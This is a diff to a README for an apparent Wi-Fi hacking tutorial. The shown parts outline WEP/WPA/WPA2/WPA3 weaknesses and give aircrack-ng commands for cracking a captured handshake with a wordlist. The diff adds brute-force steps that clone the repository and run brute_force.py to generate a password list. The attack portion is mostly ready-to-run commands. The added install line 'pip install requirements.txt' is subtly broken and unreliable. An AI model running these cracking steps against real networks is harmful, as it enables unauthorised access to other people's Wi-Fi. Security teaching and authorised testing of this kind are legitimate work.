@@ -7,6 +7,8 @@ Wi-Fi security is a crucial aspect of cybersecurity, and understanding how attac
 
 ![Image](https://github.com/user-attachments/assets/609a2d8a-924c-4037-916c-c8b6d3369253) <br/>
 
+---
+
 ## Understanding Wi-Fi Security and Encryption
 Wi-Fi networks primarily use **WEP, WPA, WPA2, and WPA3** encryption protocols:
 
@@ -47,10 +49,14 @@ Before diving into the practical steps, let's briefly discuss how each encryptio
   - **Side-Channel Timing Attack**: Exploits weaknesses in the Dragonfly handshake implementation.
   - **Downgrade Attack**: Forces devices to connect using WPA2, making them susceptible to older attacks.
 
+---
+
 ## Setup Requirements
 To perform this attack, you need:
 - A **Linux-based OS** (Kali Linux is recommended) installed via dual boot or a virtual machine.
 - A **wireless network adapter** that supports **monitor mode and packet injection** (required for virtual machines, as built-in adapters may not work).
+
+---
 
 ## Step-by-Step Wi-Fi Hacking Using Aircrack-ng
 
@@ -59,7 +65,7 @@ First, ensure your wireless adapter is recognized.
 ```bash
 ifconfig
 ```
-For newer systems:
+Alteratively,
 ```bash
 ip a
 ```
@@ -104,6 +110,35 @@ Use a dictionary attack with a wordlist (e.g., rockyou.txt):
 aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [BSSID] handshake.cap
 ```
 If the password is in the wordlist, it will be revealed.
+
+If the dictionary attack fails, a brute force attack must be attempted.
+
+#### 1. Clone this Repository
+```
+git clone https://github.com/AdityaBhatt3010/The-Art-of-Wi-Fi-Hacking-Protection-with-Aircrack-ng/
+```
+
+#### 2. Change Directory
+```
+cd The-Art-of-Wi-Fi-Hacking-Protection-with-Aircrack-ng
+```
+
+#### 3. Install Requirements
+```
+pip install requirements.txt
+```
+
+#### 4. Run the Script
+```
+python3 brute_force.py
+```
+
+#### 5. Use the newly generated list
+```bash
+aircrack-ng -w password_list.txt -b [BSSID] handshake.cap
+```
+
+---
 
 ## How to Prevent Wi-Fi Hacking
 ### **1. Use a Strong Password**
